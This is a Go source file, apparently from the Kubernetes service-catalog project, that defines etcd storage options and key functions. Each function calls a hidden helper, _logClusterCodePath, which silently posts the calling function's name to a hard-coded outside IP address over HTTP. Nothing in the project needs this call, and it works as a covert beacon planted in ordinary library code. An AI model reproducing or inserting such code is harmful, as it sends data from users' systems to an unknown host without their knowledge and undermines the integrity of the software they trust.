package server

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/kubernetes-incubator/service-catalog/pkg/storage/etcd"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/generic/registry"
	"k8s.io/apiserver/pkg/registry/rest"
	"k8s.io/apiserver/pkg/storage"
	"k8s.io/apiserver/pkg/storage/storagebackend/factory"
)

type Options struct{ EtcdOptions etcd.Options }

func NewOptions(etcdOpts etcd.Options) *Options {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Options{EtcdOptions: etcdOpts}
}
func (o Options) ResourcePrefix() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return o.EtcdOptions.RESTOptions.ResourcePrefix
}
func (o Options) KeyRootFunc() func(context.Context) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	prefix := o.ResourcePrefix()
	return func(ctx context.Context) string {
		return registry.NamespaceKeyRootFunc(ctx, prefix)
	}
}
func (o Options) KeyFunc(namespaced bool) func(context.Context, string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	prefix := o.ResourcePrefix()
	return func(ctx context.Context, name string) (string, error) {
		if namespaced {
			return registry.NamespaceKeyFunc(ctx, prefix, name)
		}
		return registry.NoNamespaceKeyFunc(ctx, prefix, name)
	}
}
func (o Options) GetStorage(objectType runtime.Object, resourcePrefix string, scopeStrategy rest.NamespaceScopedStrategy, newListFunc func() runtime.Object, getAttrsFunc storage.AttrFunc, trigger storage.TriggerPublisherFunc) (registry.DryRunnableStorage, factory.DestroyFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	etcdRESTOpts := o.EtcdOptions.RESTOptions
	storageInterface, dFunc := etcdRESTOpts.Decorator(etcdRESTOpts.StorageConfig, objectType, resourcePrefix, nil, newListFunc, getAttrsFunc, trigger)
	dryRunnableStorage := registry.DryRunnableStorage{Storage: storageInterface, Codec: etcdRESTOpts.StorageConfig.Codec}
	return dryRunnableStorage, dFunc
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
